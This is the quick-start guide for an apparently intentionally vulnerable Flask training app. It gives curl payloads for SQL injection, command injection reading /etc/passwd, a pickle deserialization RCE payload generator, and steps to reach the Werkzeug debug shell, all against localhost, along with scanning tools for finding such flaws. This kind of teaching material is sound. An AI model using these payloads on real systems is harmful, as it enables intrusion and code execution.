# 🚀 Installation Guide & Quick Start

## 📋 Prerequisites

- **Python 3.8+**
- **pip** or **poetry**
- **Git**
- (Optional) **Docker & Docker Compose**

---

## 📥 Installation

### Option 1 : Local Installation

```bash
# Clone the repository
git clone https://github.com/username/security-vulnerabilities.git
cd security-vulnerabilities

# Create a virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r python/requirements.txt
```

### Option 2 : With Docker

```bash
# Build the image
docker build -t security-vuln .

# Run the container
docker run -p 5000:5000 security-vuln

# Or with Docker Compose
docker-compose up
```

---

## 🎯 Usage

### Start the Application

```bash
# Activate the virtual environment (if not done)
source venv/bin/activate

# Run the app
python python/main.py
```

The application starts on `http://localhost:5000`

---

## 🧪 Testing Vulnerabilities

### 1️⃣ SQL Injection

```bash
# Normal request
curl "http://localhost:5000/vulnerable-action?data=1"

# SQL Injection - Bypass
curl "http://localhost:5000/vulnerable-action?data=' OR '1'='1"

# SQL Injection - Data extraction
curl "http://localhost:5000/vulnerable-action?data=' UNION SELECT * FROM admin--"
```

---

### 2️⃣ Command Injection

```bash
# Normal request
curl "http://localhost:5000/vulnerable-action?data=hello"

# Command Injection - Read a file
curl "http://localhost:5000/vulnerable-action?data=;cat%20/etc/passwd"

# Command Injection - Execute whoami
curl "http://localhost:5000/vulnerable-action?data=;whoami"
```

⚠️ On Windows, use `|` instead of `;`

---

### 3️⃣ Insecure Deserialization (Pickle)

Generate an exploitation payload :

```python
import pickle
import base64
import os

# Create a malicious payload
class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned',))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()
print(f"?data={encoded}")
```

Send the payload :
```bash
curl "http://localhost:5000/vulnerable-action?data={ENCODED_PAYLOAD}"
```

---

### 4️⃣ Hardcoded Secret Keys

Check the source code or use tools :

```bash
# With grep
grep -r "SECRET_KEY\|PASSWORD" .

# With gitleaks
gitleaks detect --source . -v
```

---

### 5️⃣ Debug Mode

Access the Werkzeug debugger :

```
http://localhost:5000/vulnerable-action?data=invalid
# Click the console button to access the interactive shell
```

---

## 🔍 Analyze with Security Tools

### Bandit (Python Scan)
```bash
pip install bandit
bandit -r . -ll
```

### Semgrep (SAST)
```bash
pip install semgrep
semgrep --config=p/security-audit .
```

### OWASP ZAP (Dynamic Scan)
```bash
# Install: https://www.zaproxy.org/
zaproxy.sh -cmd -quickurl http://localhost:5000 -quickout report.html
```

---

## 📚 Project Structure

```
security-vulnerabilities/
├── README.md                    # Overview
├── QUICKSTART.md                # Installation & quick start
├── SECURITY_FIXES.md            # Detailed solutions
├── CODE_OF_CONDUCT.md           # Usage policy
├── Dockerfile                   # Docker configuration
├── docker-compose.yml           # Docker orchestration
├── .gitignore                   # Files to ignore
├── .env.example                 # Environment variables template
├── python/
│   ├── main.py                  # Vulnerable code
│   └── requirements.txt         # Python dependencies
├── tests/                       # Exploitation tests (future)
└── docs/                        # Additional documentation (future)
```

---

## ❌ Troubleshooting

### Port 5000 already in use
```bash
# Find the process
lsof -i :5000

# Or use a different port
python python/main.py --port 5001
```

### Error: Flask module not found
```bash
# Check that the virtual environment is activated
which python

# Reinstall dependencies
pip install --upgrade -r python/requirements.txt
```

### Error: Permission denied
```bash
# On macOS/Linux
chmod +x python/main.py
python python/main.py
```

---

## 🎓 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

**Questions? See [SECURITY_FIXES.md](SECURITY_FIXES.md) for detailed solutions.**

Last updated : January 2026
